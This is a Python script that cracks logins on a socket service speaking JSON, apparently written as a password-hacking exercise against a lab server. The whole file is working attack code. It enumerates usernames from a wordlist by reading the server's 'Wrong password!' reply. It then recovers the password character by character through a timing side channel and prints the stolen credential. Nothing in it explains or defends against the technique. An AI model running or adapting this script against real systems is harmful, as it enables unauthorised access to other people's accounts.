import socket
import sys
import json
import string
import logging
from datetime import datetime

logging.basicConfig(filename='debug.log', filemode='w', level=logging.DEBUG)


def brute_force_login(socket_connection, file_name):
    """
    :param socket_connection: connected socket object
    :param file_name: string or path representing file name
    :return: username
    """
    credential = {"login": "", "password": ' '}
    with open(file_name) as file_handler:
        for line in file_handler:
            login = line.strip('\r\n')
            credential["login"] = login
            socket_connection.send(json.dumps(credential).encode('utf8'))
            response = json.loads(socket_connection.recv(1024).decode('utf8'))
            if response["result"] == "Wrong password!":
                return login


def brute_force_pass(socket_connection, username):
    """
    :param socket_connection: connected socket object
    :param username: valid existing username
    :return: cracked credential in JSON format
    """
    password = ''
    while True:
        for pass_attempt in string.ascii_letters + string.digits + string.punctuation:
            try:
                credential = {'login': username, 'password': password + pass_attempt}
                socket_connection.send(json.dumps(credential).encode('utf8'))
                time_before_response = datetime.now()
                response = json.loads(socket_connection.recv(1024).decode('utf8'))
                time_after_response = datetime.now()
                difference = time_after_response - time_before_response

                if difference.microseconds > 100000:
                    logging.debug(response['result'])
                    logging.debug(pass_attempt)
                    password += pass_attempt
                    
                if response['result'] == 'Connection success!':
                    logging.debug(response)
                    return json.dumps(credential)
                
            except Exception as e:
                logging.error(str(e))
        

def establish_connection():
    """
    Receives ip address and port from CLI, calls dictionary_attack
    with address and port
    """
    ip_address = sys.argv[1]
    port = sys.argv[2]
    client_socket = socket.socket()
    client_socket.connect((ip_address, int(port)))
    username = brute_force_login(client_socket, 'logins.txt')
    print(brute_force_pass(client_socket, username))


establish_connection()
